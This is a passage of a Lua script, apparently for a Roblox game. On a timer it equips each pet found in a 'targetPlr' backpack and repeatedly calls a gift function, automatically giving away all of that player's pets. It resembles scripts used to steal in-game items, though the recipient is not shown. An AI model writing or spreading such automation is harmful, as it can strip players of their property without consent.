        task.wait(2)
        local current = GetPlayerPets()
        if #current == 0 then continue end
        for _, pet in current do
            for _, tool in targetPlr.Backpack:GetChildren() do
                if tool:IsA("Tool")
                and tool:GetAttribute("ItemType") == "Pet"
                and tool:GetAttribute("PET_UUID") == pet.Id then
                    print("Equipping & gifting:", tool.Name)
                    targetPlr.Character.Humanoid:EquipTool(tool)
                    task.wait(0.6)
                    for i = 1, 3 do
                        if giftHeldPet() then break end
                        task.wait(0.3)
                    end
                end
            end
        end
    end
end)
